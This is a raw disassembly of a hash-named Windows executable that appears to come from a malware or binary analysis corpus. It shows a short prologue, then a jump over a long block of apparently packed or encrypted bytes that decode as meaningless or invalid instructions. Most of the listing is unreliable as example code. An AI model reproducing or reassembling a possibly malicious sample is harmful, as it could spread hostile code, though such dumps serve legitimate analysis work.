
1af210cb0aa9e171e1287d827cb32f9b5806435264b0c28dba231c8324929212.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xb893208,cl
  401025:	add    bh,BYTE PTR [esi+0x7e]
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    BYTE PTR [ebp+0x0],dh
  40103d:	rdpmc  
  40103f:	xadd   BYTE PTR [eax],bl
  401042:	(bad)  
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x8087b5a4
  4010d8:	fdiv   DWORD PTR [esi-0x2455b20e]
  4010de:	pop    esp
  4010df:	ret    0x6932
  4010e2:	or     eax,0x839439c6
  4010e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010e8:	and    BYTE PTR [edx-0x114ca3f9],cl
  4010ee:	mov    ?,WORD PTR [ecx+0x20]
  4010f1:	fidiv  WORD PTR [ecx+0x4b]
  4010f4:	adc    BYTE PTR [ecx-0xc],dh
  4010f7:	cmp    ah,BYTE PTR [edx-0x19111927]
  4010fd:	push   ss
  4010fe:	and    al,BYTE PTR [ebx+eiz*4+0x25974186]
  401105:	lahf   
  401106:	jo     0x401090
  401108:	push   ss
  401109:	inc    eax
  40110a:	(bad)  
  40110c:	xlat   BYTE PTR ds:[ebx]
  40110d:	(bad)  
  40110e:	jne    0x40118a
  401110:	adc    eax,0xf4e1ec9b
  401115:	push   ss
  401116:	rcl    DWORD PTR [esi],0x50
  401119:	jno    0x4010a3
  40111b:	call   0x3ee3:0x7a531cce
  401122:	push   edi
  401123:	comiss xmm7,DWORD PTR [eax]
  401126:	mov    ebp,edi
  401128:	push   ebx
  401129:	imul   edi,DWORD PTR [eax-0x2c6ddb10],0xf432263f
  401133:	ja     0x4010e3
  401135:	loope  0x40119f
  401137:	push   ebp
  401138:	pushw  cs
  40113a:	(bad)  
  40113b:	xlat   BYTE PTR ds:[ebx]
  40113c:	sub    al,0xa9
  40113e:	es pop es
  401140:	dec    edi
  401141:	add    al,0xd4
  401143:	and    BYTE PTR [esi+0x68],ch
  401146:	dec    edx
  401147:	out    0x9e,al
  401149:	mov    ch,0x3d
  40114b:	retf   0xdaf2
  40114e:	mov    esi,0x3d82c8e2
  401153:	inc    edi
  401154:	hlt    
  401155:	jmp    0xd4e4a4ad
  40115a:	das    
  40115b:	sub    al,0x84
  40115d:	mov    al,ds:0xe2a59241
  401162:	dec    eax
  401163:	sub    esp,edx
  401165:	mov    al,ds:0x62cfb06d
  40116a:	pusha  
  40116b:	or     al,cl
  40116d:	cmp    ah,BYTE PTR [edx]
  40116f:	repnz or bh,BYTE PTR ds:0xb8900a96
  401176:	sbb    al,0x66
  401178:	adc    al,0x35
  40117a:	mov    DWORD PTR [ebx],esi
  40117c:	ret    
  40117d:	bound  edx,QWORD PTR [edx-0x316212f1]
  401183:	push   edx
  401184:	fcmovnu st,st(0)
  401186:	in     al,dx
  401187:	mov    dl,0x2d
  401189:	pop    edi
  40118a:	jns    0x40111b
  40118c:	push   ecx
  40118d:	cmp    DWORD PTR [eax-0x7c],ecx
  401190:	jno    0x40118a
  401192:	mov    WORD PTR [ecx-0x76],cs
  401195:	jno    0x4011aa
  401197:	inc    ebx
  401198:	xor    esi,DWORD PTR [edx-0x45]
  40119b:	out    dx,eax
  40119c:	gs (bad) 
  40119e:	xor    BYTE PTR [edi+0xd],dh
  4011a1:	sbb    ecx,DWORD PTR [edx]
  4011a3:	bound  edx,QWORD PTR [edi+esi*8]
  4011a6:	and    esp,DWORD PTR [eax]
  4011a8:	sar    DWORD PTR [esi-0x5c7494a8],1
  4011ae:	xchg   ecx,eax
  4011af:	shl    DWORD PTR [ecx+ecx*4-0x5d],cl
  4011b3:	repz xchg edi,eax
  4011b5:	fwait
  4011b6:	add    eax,0xbf1a693d
  4011bb:	std    
  4011bc:	xchg   BYTE PTR ds:0xba89799d,ch
  4011c2:	pop    ebx
  4011c3:	div    al
  4011c5:	cmp    DWORD PTR [esi+0x20],ebx
  4011c8:	sub    WORD PTR [eax],sp
  4011cb:	sar    BYTE PTR [esi],cl
  4011cd:	rcl    BYTE PTR [esi],cl
  4011cf:	icebp  
  4011d0:	repnz pop edx
  4011d2:	lds    esp,FWORD PTR [ebp-0x73]
  4011d5:	leave  
  4011d6:	ror    esp,0xd1
  4011d9:	xor    ecx,esi
  4011db:	mov    ebx,DWORD PTR [edi]
  4011dd:	add    DWORD PTR [edx-0x4a856404],edi
  4011e3:	push   ebx
  4011e4:	push   edi
  4011e5:	xchg   edx,eax
  4011e6:	in     eax,0x4e
  4011e8:	fadd   DWORD PTR [edx-0x52]
  4011eb:	popa   
  4011ec:	pop    eax
  4011ed:	inc    edi
  4011ee:	sbb    al,0x85
  4011f0:	add    DWORD PTR [ecx],eax
  4011f2:	adc    BYTE PTR [esi-0x79],dh
  4011f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011f6:	sub    al,0x20
  4011f8:	mov    dh,0x1d
  4011fa:	xor    eax,0x9d373637
  4011ff:	call   0xf79:0x44e39091
  401206:	retf   
  401207:	push   ecx
  401208:	jo     0x401263
  40120a:	(bad)  
  40120b:	fidiv  DWORD PTR [ecx]
  40120d:	xor    ch,BYTE PTR [eax+0x63245ce4]
  401213:	mov    gs,WORD PTR [esi-0x2c]
  401216:	int3   
  401217:	ror    BYTE PTR [ebx+0x14],0xe
  40121b:	mov    BYTE PTR [ebx+0x387c23ab],al
  401221:	clc    
  401222:	inc    BYTE PTR [edi]
  401224:	pop    ebp
  401225:	push   edx
  401226:	add    eax,0x33192440
  40122b:	adc    al,0x71
  40122d:	push   es
  40122e:	mov    esp,0x6acfe06f
  401233:	aaa    
  401234:	cli    
  401235:	pop    esi
  401236:	mov    ebx,?
  401238:	jmp    0xe226906c
  40123d:	in     eax,dx
  40123e:	in     al,dx
  40123f:	test   dh,cl
  401241:	and    eax,0x71f232e5
  401246:	clc    
  401247:	dec    esi
  401248:	ins    DWORD PTR es:[edi],dx
  401249:	ror    DWORD PTR [eax],1
  40124b:	popf   
  40124c:	cmp    BYTE PTR [ecx+0x3b],bh
  40124f:	xor    ah,bh
  401251:	gs inc esi
  401253:	pop    esi
  401254:	scas   eax,DWORD PTR es:[edi]
  401255:	mov    al,0x41
  401257:	lahf   
  401258:	scas   eax,DWORD PTR es:[edi]
  401259:	add    al,0x44
  40125b:	adc    al,0x4b
  40125d:	in     al,0x7f
  40125f:	push   ecx
  401260:	ret    0x134d
  401263:	in     eax,dx
  401264:	(bad)  
  401265:	fsub   st,st(5)
  401267:	mov    eax,ds:0x6387a1c2
  40126c:	daa    
  40126d:	gs clc 
  40126f:	jno    0x4011fa
  401271:	out    dx,eax
  401272:	retf   0x3692
  401275:	or     al,0x29
  401277:	xchg   edi,eax
  401278:	xchg   esp,eax
  401279:	mov    edx,0x610b38f2
  40127e:	jb     0x401221
  401280:	(bad)  
  401281:	xchg   ebx,eax
  401282:	mov    ds:0x8f993f26,eax
  401287:	les    edx,FWORD PTR [ebx]
  401289:	cld    
  40128a:	dec    edx
  40128b:	push   es
  40128c:	retf   0xd7be
  40128f:	jle    0x40126a
  401291:	dec    esp
  401292:	add    dl,BYTE PTR [edi+0x5b]
  401295:	and    DWORD PTR [eax+0x781561c4],eax
  40129b:	test   BYTE PTR [ebx-0x79],ch
  40129e:	lods   eax,DWORD PTR ds:[esi]
  40129f:	pop    ebx
  4012a0:	jg     0x401222
  4012a2:	jb     0x401291
  4012a4:	loop   0x4012da
  4012a6:	and    dh,BYTE PTR ds:0x62621652
  4012ac:	sub    edi,edi
  4012ae:	jg     0x401295
  4012b0:	lahf   
  4012b1:	and    edi,0x30269414
  4012b7:	dec    ebx
  4012b8:	push   ecx
  4012b9:	aas    
  4012ba:	pop    DWORD PTR [edx]
  4012bc:	clc    
  4012bd:	adc    DWORD PTR [ebx],ecx
  4012bf:	cdq    
  4012c0:	ja     0x401242
  4012c2:	aaa    
  4012c3:	push   ss
  4012c4:	int3   
  4012c5:	cmp    BYTE PTR [edx+0x57],0x48
  4012c9:	(bad)
  4012ce:	lahf   
  4012cf:	pusha  
  4012d0:	loopne 0x4012a3
  4012d2:	ret    0xa994
  4012d5:	pop    eax
  4012d6:	hlt    
  4012d7:	gs aam 0x2f
  4012da:	dec    esi
  4012db:	shl    DWORD PTR [edx+eax*4-0x13],0xf4
  4012e0:	stc    
  4012e1:	push   ebp
  4012e2:	push   0xa22c66b3
  4012e7:	jecxz  0x401285
  4012e9:	mov    dl,bl
  4012eb:	jmp    0x8091bfd
  4012f0:	pop    ecx
  4012f1:	mov    edi,0x339ef7da
  4012f6:	pop    ss
  4012f7:	mov    WORD PTR [ebx],ds
  4012f9:	fstp   DWORD PTR [edi-0x11204746]
  4012ff:	mov    bl,0xea
  401301:	sbb    BYTE PTR [ebx+ebp*4+0xf],dh
  401305:	xchg   ebp,eax
  401306:	pop    edi
  401307:	or     cl,ch
  401309:	adc    eax,0xd62ef6c
  40130e:	cs loope 0x4012dc
  401311:	cmp    eax,0x6f317e09
  401316:	sbb    ah,BYTE PTR [edx+0x2]
  401319:	xor    cl,BYTE PTR [edx]
  40131b:	cmp    ch,bl
  40131d:	sub    BYTE PTR [esi+edx*2],0x5a
  401321:	mov    ds:0x3b7ea6ab,eax
  401326:	outs   dx,BYTE PTR ds:[esi]
  401327:	sahf   
  401328:	test   al,dh
  40132a:	and    DWORD PTR [edx+0x68],ebx
  40132d:	cwde   
  40132e:	mov    DWORD PTR [edi-0x5a1f1c60],0x956b4ea7
  401338:	pop    esi
  401339:	mov    esp,0xfcecdecc
  40133e:	jb     0x40136b
  401340:	(bad)  
  401341:	sbb    eax,0x6cb3489a
  401346:	xor    BYTE PTR [ecx+edx*2+0x11bdaaba],dl
  40134d:	cmp    eax,0xd6f4a223
  401352:	pop    ss
  401353:	inc    ecx
  401354:	dec    edi
  401355:	dec    eax
  401356:	shr    DWORD PTR [esi-0x3f],1
  401359:	cmp    bl,BYTE PTR [edi]
  40135b:	dec    ebx
  40135c:	fld    DWORD PTR [esi]
  40135e:	cmc    
  40135f:	jbe    0x40133a
  401361:	in     al,dx
  401362:	js     0x401324
  401364:	jge    0x401330
  401366:	push   ebp
  401367:	and    edx,eax
  401369:	into   
  40136a:	ins    BYTE PTR es:[edi],dx
  40136b:	hlt    
  40136c:	loopne 0x401385
  40136e:	aam    0xd0
  401370:	or     DWORD PTR [ebx],ebx
  401372:	imul   esp,ecx,0x5edf303d
  401378:	jmp    0x6872291f
  40137d:	ret    
  40137e:	push   ebp
  40137f:	rcr    DWORD PTR [ebp+0x35],cl
  401382:	inc    esi
  401383:	jp     0x4013ac
  401385:	add    dl,cl
  401387:	or     esp,DWORD PTR [ebp+0x2071ad45]
  40138d:	fisub  DWORD PTR [ecx+0x1]
  401390:	inc    ecx
  401391:	into   
  401392:	les    esp,FWORD PTR [edx-0x2f]
  401395:	aam    0x42
  401397:	add    eax,0x72df7b79
  40139c:	aaa    
  40139d:	or     ecx,ecx
  40139f:	and    ch,dh
  4013a1:	dec    esi
  4013a2:	pop    esp
  4013a3:	push   cs
  4013a4:	push   edx
  4013a5:	dec    ebp
  4013a6:	push   ds
  4013a7:	jnp    0x4013ef
  4013a9:	fild   DWORD PTR [eax+0x49]
  4013ac:	mov    DWORD PTR [ebp+0x4efb722c],ebx
  4013b2:	jns    0x40133c
  4013b4:	pusha  
  4013b5:	pop    ebp
  4013b6:	sub    DWORD PTR [eax],esi
  4013b8:	jp     0xfe1ffd6
  4013be:	imul   ebx,DWORD PTR [ecx+ebx*1+0x20],0x2aceaf17
  4013c6:	cld    
  4013c7:	sbb    edx,DWORD PTR ss:[ecx+0x36]
  4013cb:	fidivr WORD PTR [edx-0x39]
  4013ce:	xchg   esp,eax
  4013cf:	mov    dh,0xbc
  4013d1:	js     0x40141d
  4013d3:	or     DWORD PTR [edx],ebx
  4013d5:	in     al,0xe8
  4013d7:	add    BYTE PTR [eax-0x71],0x7e
  4013db:	xor    eax,0xe906adb
  4013e0:	inc    ebp
  4013e1:	fist   DWORD PTR [edx-0x2]
  4013e4:	push   ebx
  4013e5:	test   BYTE PTR [edx-0x819c81f],ah
  4013eb:	adc    BYTE PTR [edi+0x60630450],al
  4013f1:	xchg   edi,eax
  4013f2:	scas   al,BYTE PTR es:[edi]
  4013f3:	ds icebp 
  4013f5:	pop    ds
  4013f6:	cdq    
  4013f7:	pusha  
  4013f8:	cli    
  4013f9:	jg     0x4013ef
  4013fb:	popf   
  4013fc:	test   BYTE PTR [ecx],dl
  4013fe:	mov    esp,0x25fb7f31
  401403:	mul    DWORD PTR [ebp+0x13]
  401406:	mov    al,ds:0x63d051b6
  40140b:	aaa    
  40140c:	addr16 jl 0x40139a
  40140f:	or     ch,BYTE PTR [edi+0x62]
  401412:	jle    0x40143b
  401414:	mov    ebp,0x67633f6b
  401419:	test   DWORD PTR [edx+edi*2],eax
  40141c:	cdq    
  40141d:	dec    edx
  40141e:	sub    esp,DWORD PTR [ecx+0x413cee]
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43364b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433673,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4336eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4336f3
  401461:	sbb    DWORD PTR ds:0x4336ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433743,0x1c
  401476:	cmp    DWORD PTR ds:0x433743,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433743,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433743
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433743,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ecx,DWORD PTR [esi+0x6f901824]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014a4
  4014ce:	jmp    0x4014c1
  4014d0:	shl    BYTE PTR [ebp+0x31ed884b],cl
  4014d6:	xchg   esi,eax
  4014d7:	xchg   DWORD PTR [eax-0xff253e9],ebx
  4014dd:	dec    ebx
  4014de:	or     DWORD PTR [ebp-0x17ba239d],edx
  4014e4:	js     0x40152a
  4014e6:	fwait
  4014e7:	bound  esi,QWORD PTR [ecx]
  4014e9:	inc    esp
  4014ea:	xchg   edi,eax
  4014eb:	mov    ebp,0xf37b0685
  4014f0:	in     al,0x56
  4014f2:	test   DWORD PTR [ecx+0x2e],edi
  4014f5:	js     0x401543
  4014f7:	test   BYTE PTR [edx-0x3d],0x87
  4014fb:	call   0x9450:0x3bfe1336
  401502:	adc    edx,ebp
  401504:	jmp    DWORD PTR [esi-0x74162c3d]
  40150a:	(bad)  
  40150c:	in     eax,0xfb
  40150e:	or     al,0xe4
  401510:	push   esi
  401511:	ins    BYTE PTR es:[edi],dx
  401512:	in     al,dx
  401513:	stc    
  401514:	fisub  WORD PTR [ebp-0x6a]
  401517:	ins    BYTE PTR es:[edi],dx
  401518:	(bad)  
  401519:	lock mov ebp,0x7e9ae284
  40151f:	bound  edi,QWORD PTR [edi]
  401521:	push   esp
  401522:	(bad)  
  401523:	push   ebx
  401524:	js     0x40158f
  401526:	dec    esi
  401527:	mov    edi,esi
  401529:	push   esi
  40152a:	int    0xfe
  40152c:	pop    es
  40152d:	push   ebp
  40152e:	(bad)  
  40152f:	jmp    0x14532216
  401534:	clc    
  401535:	jae    0x4014d9
  401537:	mov    ecx,gs
  401539:	or     dh,cl
  40153b:	sbb    ah,dh
  40153d:	stc    
  40153e:	adc    dl,bl
  401540:	dec    esp
  401541:	dec    ecx
  401542:	aas    
  401543:	loopne 0x401538
  401545:	xchg   BYTE PTR [edx+0x6c],bl
  401548:	aaa    
  401549:	push   edi
  40154a:	fs out dx,eax
  40154c:	xchg   edx,eax
  40154d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40154e:	jnp    0x401572
  401550:	xor    bl,al
  401552:	push   ss
  401553:	xor    BYTE PTR [ebx-0x5b],0xc7
  401557:	in     al,0xbb
  401559:	rol    BYTE PTR [edx+ecx*8],0xe8
  40155d:	xor    cl,BYTE PTR [ebp+edx*2-0x5af36336]
  401564:	(bad)  
  401565:	xor    DWORD PTR [edi],ebx
  401567:	xchg   ecx,eax
  401568:	inc    esp
  401569:	jmp    0x827ddf5a
  40156e:	sbb    edx,DWORD PTR [edx]
  401570:	retf   
  401571:	rcl    BYTE PTR [esi-0x39],0x51
  401575:	sub    esi,esp
  401577:	adc    al,0x66
  401579:	imul   ecx,ebx,0xffffffd3
  40157c:	lea    edi,[ebx+eax*8]
  40157f:	sub    DWORD PTR [edx-0x4e08f75e],0x71
  401586:	mov    eax,ds:0x2396b43a
  40158b:	pusha  
  40158c:	adc    al,0xb1
  40158e:	scas   eax,DWORD PTR es:[edi]
  40158f:	and    eax,DWORD PTR [edx-0x480c424f]
  401595:	(bad)  
  401596:	and    DWORD PTR [ebp-0x1],esi
  401599:	xchg   ebp,eax
  40159a:	call   0xd0b8:0xec2e2450
  4015a1:	pop    es
  4015a2:	std    
  4015a3:	add    esi,DWORD PTR [ebx-0x3b]
  4015a6:	mov    eax,DWORD PTR ds:0x35d83415
  4015ac:	xor    bh,bh
  4015ae:	jmp    0xb722:0x502e36ca
  4015b5:	sbb    eax,ebx
  4015b7:	pop    esp
  4015b8:	sbb    eax,0x3acafd5d
  4015bd:	jge    0x40160e
  4015bf:	test   BYTE PTR [ebp+0x7ba08f0e],dl
  4015c5:	fiadd  WORD PTR [esi]
  4015c7:	fs dec edi
  4015c9:	popf   
  4015ca:	mov    esi,edi
  4015cc:	dec    edi
  4015cd:	(bad)  
  4015ce:	jno    0x401583
  4015d0:	ins    DWORD PTR es:[edi],dx
  4015d1:	out    dx,al
  4015d2:	cmp    eax,0xd505dca0
  4015d7:	jnp    0x401568
  4015d9:	imul   edx,DWORD PTR [esi*1+0x6576597f],0x8
  4015e1:	mov    ecx,edi
  4015e3:	add    eax,0x57c74470
  4015e8:	popa   
  4015e9:	dec    esi
  4015ea:	rol    BYTE PTR [edi],1
  4015ec:	dec    ecx
  4015ed:	mov    ch,0x61
  4015ef:	ins    DWORD PTR es:[edi],dx
  4015f0:	fidiv  WORD PTR [ecx]
  4015f2:	pusha  
  4015f3:	in     eax,dx
  4015f4:	and    BYTE PTR [ebx+esi*4],0xe5
  4015f8:	inc    ecx
  4015f9:	cdq    
  4015fa:	xlat   BYTE PTR ds:[ebx]
  4015fb:	jg     0x401610
  4015fd:	inc    esi
  4015fe:	imul   BYTE PTR [ecx]
  401600:	xor    bl,BYTE PTR [ebp+0x61d26b13]
  401606:	das    
  401607:	push   esp
  401608:	sub    ecx,edi
  40160a:	lods   eax,DWORD PTR ds:[esi]
  40160b:	popf   
  40160c:	push   es
  40160d:	sub    dh,BYTE PTR [ecx]
  40160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401610:	xchg   esp,eax
  401611:	mov    edi,cs
  401613:	jnp    0x401645
  401615:	mov    ds:0x6604039f,al
  40161a:	hlt    
  40161b:	fwait
  40161c:	xchg   edx,eax
  40161d:	imul   BYTE PTR [esi+0x7f102896]
  401623:	stos   DWORD PTR es:[edi],eax
  401624:	mov    dl,0xf3
  401626:	fs xor eax,0x5ed60943
  40162c:	cmp    dl,bh
  40162e:	repz scas eax,DWORD PTR es:[edi]
  401630:	mov    dl,0xb2
  401632:	push   esi
  401633:	mov    ebp,0x74c7c2f0
  401638:	xchg   esp,eax
  401639:	les    eax,FWORD PTR ds:0xcd1d46a3
  40163f:	adc    BYTE PTR [ebx-0x2c],cl
  401642:	jnp    0x4015c7
  401644:	int3   
  401645:	push   ebp
  401646:	imul   esp,DWORD PTR [esi],0x40
  401649:	test   al,0xb9
  40164b:	mov    edi,0xf2237b27
  401650:	lock jnp 0x401670
  401653:	xchg   edi,eax
  401654:	(bad)  
  401655:	sub    eax,0x16b20088
  40165a:	test   al,0xa8
  40165c:	push   ebp
  40165d:	imul   edx,esp,0x14
  401660:	jp     0x4016cd
  401662:	pop    es
  401663:	xor    eax,edx
  401665:	cwde   
  401666:	jmp    0xcffc576c
  40166b:	sub    al,BYTE PTR ds:0xa4522324
  401671:	cld    
  401672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401673:	mov    edx,0x56a592e5
  401678:	cwde   
  401679:	call   0xf76a9a33
  40167e:	sub    DWORD PTR [ebx+0x6cbb6ac6],ebx
  401684:	out    0x57,eax
  401686:	cmp    edx,0xffffffb6
  401689:	(bad)  
  40168a:	nop
  40168b:	(bad)  
  40168c:	inc    esp
  40168d:	rol    BYTE PTR [esi+0x63174e0d],1
  401693:	cwde   
  401694:	pop    es
  401695:	lods   eax,DWORD PTR ds:[esi]
  401696:	pop    edi
  401697:	xchg   edi,eax
  401698:	int3   
  401699:	shl    BYTE PTR [edx+edx*8-0x7915f068],cl
  4016a0:	and    al,cl
  4016a2:	pushf  
  4016a3:	sbb    al,BYTE PTR [esi-0x16]
  4016a6:	ror    DWORD PTR [ecx],cl
  4016a8:	mov    ah,0x1
  4016aa:	lods   al,BYTE PTR ds:[esi]
  4016ab:	sahf   
  4016ac:	push   esp
  4016ad:	pop    ebp
  4016ae:	pop    ss
  4016af:	ss cmp eax,0x56394f0f
  4016b5:	int3   
  4016b6:	mov    ah,0xb4
  4016b8:	add    al,0x2
  4016ba:	xor    esp,DWORD PTR [eax-0x45]
  4016bd:	push   es
  4016be:	test   BYTE PTR [edi],dh
  4016c0:	(bad)  [esi+0x43]
  4016c3:	pop    es
  4016c4:	out    0x8a,eax
  4016c6:	xchg   esp,eax
  4016c7:	fadd   DWORD PTR [edi+0x70]
  4016ca:	in     eax,0x4d
  4016cc:	retf   0x7214
  4016cf:	mov    edx,0x5effa135
  4016d4:	mov    eax,0x51659b49
  4016d9:	inc    edx
  4016da:	imul   edi,DWORD PTR [ebp+0x79e1240f],0xfffffff5
  4016e1:	add    DWORD PTR [ecx],ebp
  4016e3:	xchg   esi,eax
  4016e4:	pop    edx
  4016e5:	push   cs
  4016e6:	mov    edi,DWORD PTR [eax]
  4016e8:	into   
  4016e9:	xchg   edx,eax
  4016ea:	daa    
  4016eb:	(bad)  [ebp+0x50]
  4016ee:	sbb    al,bh
  4016f0:	mov    WORD PTR [ebx-0x7e39099b],?
  4016f6:	adc    eax,0x453d0554
  4016fb:	inc    esi
  4016fc:	inc    esi
  4016fd:	lods   eax,DWORD PTR ds:[esi]
  4016fe:	ficom  WORD PTR [ecx]
  401700:	(bad)  
  401701:	lods   eax,DWORD PTR ds:[esi]
  401702:	dec    esp
  401703:	mov    eax,0x2db254a0
  401708:	xchg   edi,eax
  401709:	xchg   esp,eax
  40170a:	and    al,0x72
  40170c:	cs icebp 
  40170e:	mov    ecx,0x14c7253
  401713:	mov    edi,0xd8c0302e
  401718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401719:	fwait
  40171a:	pop    esi
  40171b:	sub    BYTE PTR [edx-0xd],cl
  40171e:	leave  
  40171f:	cld    
  401720:	in     eax,dx
  401721:	cmp    edx,esp
  401723:	and    dh,cl
  401725:	push   edi
  401726:	outs   dx,BYTE PTR ds:[esi]
  401727:	push   esp
  401728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401729:	outs   dx,BYTE PTR ds:[esi]
  40172a:	es pushf 
  40172c:	cmp    eax,0x433aec0e
  401731:	add    BYTE PTR [eax],al
  401733:	pop    esi
  401734:	sti    
  401735:	sbb    edi,DWORD PTR [eax]
  401737:	test   al,0x3e
  401739:	push   esi
  40173a:	inc    esp
  40173b:	les    ebx,FWORD PTR [edx-0x57]
  40173e:	cmp    BYTE PTR [ebp+0x8],0x72
  401742:	push   cs
  401743:	jae    0x40178e
  401745:	and    DWORD PTR [edx+0x4b569ce4],eax
  40174b:	jecxz  0x401755
  40174d:	hlt    
  40174e:	push   ebx
  40174f:	mov    al,es:0xcefed46c
  401755:	ja     0x4017aa
  401757:	retf   
  401758:	xchg   ecx,eax
  401759:	xor    DWORD PTR [ecx-0x6f],0x17f37825
  401760:	or     eax,0x9cd20429
  401765:	ret    
  401766:	mov    esi,0x93eece11
  40176b:	jno    0x401762
  40176d:	js     0x401770
  40176f:	lea    edx,[esi+0x63]
  401772:	int    0x6e
  401774:	adc    BYTE PTR [ebx],dh
  401776:	loope  0x4017c2
  401778:	mov    ch,0x2
  40177a:	jae    0x401791
  40177c:	push   eax
  40177d:	xlat   BYTE PTR ds:[ebx]
  40177e:	jle    0x4017b3
  401780:	std    
  401781:	aad    0xa9
  401783:	mov    ch,0x9a
  401785:	jne    0x40171f
  401787:	push   eax
  401788:	mov    bh,dh
  40178a:	cmp    DWORD PTR [edx-0x7c22bdfc],0x4a
  401791:	inc    ebx
  401792:	add    DWORD PTR [edx],edi
  401794:	xchg   ebx,eax
  401795:	adc    ebp,DWORD PTR [ecx]
  401797:	fidiv  WORD PTR [ecx+eiz*8+0x34]
  40179b:	xchg   esp,eax
  40179c:	sbb    ebx,DWORD PTR [ecx-0x7d41aeab]
  4017a2:	push   0x50
  4017a4:	mov    ebx,ecx
  4017a6:	inc    edi
  4017a7:	cld    
  4017a8:	hlt    
  4017a9:	je     0x40175b
  4017ab:	mov    eax,ds:0x3ffceff1
  4017b0:	icebp  
  4017b1:	sub    eax,0x2086bf6d
  4017b6:	pop    eax
  4017b7:	(bad)  
  4017b8:	jp     0x4017e6
  4017ba:	sbb    eax,0x2ee24fe8
  4017bf:	rcl    BYTE PTR [ecx+edi*8],cl
  4017c2:	fwait
  4017c3:	loop   0x401795
  4017c5:	jmp    0x4017a6
  4017c7:	and    eax,0x7b436d11
  4017cc:	out    dx,al
  4017cd:	leave  
  4017ce:	add    esp,0x64e8739f
  4017d4:	int3   
  4017d5:	sub    esi,ebx
  4017d7:	out    dx,al
  4017d8:	gs std 
  4017da:	or     edx,ebx
  4017dc:	cmp    ebp,DWORD PTR [edx-0x7a]
  4017df:	push   ss
  4017e0:	adc    al,0xe5
  4017e2:	adc    cl,BYTE PTR [ecx-0x2c]
  4017e5:	stos   BYTE PTR es:[edi],al
  4017e6:	popa   
  4017e7:	dec    ebx
  4017e8:	iret   
  4017e9:	ins    BYTE PTR es:[edi],dx
  4017ea:	nop
